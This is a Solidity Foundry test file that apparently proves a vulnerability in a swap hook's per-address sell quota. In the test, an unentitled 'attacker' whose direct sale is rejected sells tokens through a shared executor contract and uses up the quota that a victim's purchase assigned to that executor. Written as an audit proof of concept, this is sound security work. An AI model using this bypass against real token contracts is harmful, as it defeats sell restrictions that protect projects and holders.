// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {SuccessorFixture, IUniversalRouter, IPermit2Allowance} from "../successor/SuccessorFixture.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Each caller supplies its own funds. This executor holds no user deposits between calls.
contract SegregatedSharedExecutor {
    function buy(IUniversalRouter router, bytes[] calldata plan) external payable {
        router.execute{value: msg.value}(hex"10", plan, block.timestamp);
    }

    function sell(
        IERC20 token,
        address permit2,
        IUniversalRouter router,
        uint256 amount,
        bytes[] calldata plan
    ) external {
        require(token.transferFrom(msg.sender, address(this), amount));
        require(token.approve(permit2, amount));
        IPermit2Allowance(permit2)
            .approve(address(token), address(router), uint160(amount), uint48(block.timestamp));
        router.execute(hex"10", plan, block.timestamp);
    }
}

contract IndependentSharedExecutorProof is SuccessorFixture {
    function _directedPlan(bool buy, uint256 amount, address recipient)
        internal
        view
        returns (bytes[] memory inputs)
    {
        bytes[] memory p = new bytes[](3);
        p[0] = abi.encode(ExactIn(key, buy, uint128(amount), 1, bytes("")));
        p[1] = abi.encode(buy ? key.currency0 : key.currency1, amount);
        p[2] = abi.encode(buy ? key.currency1 : key.currency0, recipient, uint256(0));
        inputs = new bytes[](1);
        inputs[0] = abi.encode(hex"060c0e", p);
    }

    function testUnrelatedUserConsumesVictimSharedExecutorQuotaWithoutVictimFunds() public {
        SegregatedSharedExecutor executor = new SegregatedSharedExecutor();
        vm.prank(alice);
        executor.buy{value: 1 ether}(router, _directedPlan(true, 1 ether, alice));
        uint256 bought = token.balanceOf(alice);
        uint256 cap = hook.remainingQuota(address(executor));
        assertEq(hook.eligible(address(executor)), bought);
        assertEq(hook.eligible(alice), 0);
        assertEq(hook.eligible(bob), 0);
        assertEq(cap, bought / 5);
        uint256 sale = cap / 2;
        vm.prank(payer);
        token.transfer(bob, sale);
        // Bob has tokens but no entitlement. His direct standard-router sale is rejected.
        vm.prank(bob);
        vm.expectRevert();
        router.execute(hex"10", _explorerPlan(false, sale, 1), block.timestamp);
        uint256 victimTokens = token.balanceOf(alice);
        uint256 attackerEth = bob.balance;
        vm.prank(bob);
        token.approve(address(executor), sale);
        vm.prank(bob);
        executor.sell(token, PERMIT2, router, sale, _directedPlan(false, sale, bob));
        assertGt(bob.balance, attackerEth);
        assertEq(hook.sold(bob), 0);
        assertEq(hook.sold(address(executor)), sale);
        assertEq(hook.remainingQuota(address(executor)), cap - sale);
        assertEq(token.balanceOf(alice), victimTokens, "victim funds were never stolen or touched");
        assertEq(token.balanceOf(address(executor)), 0, "no shared token custody needed");
    }
}
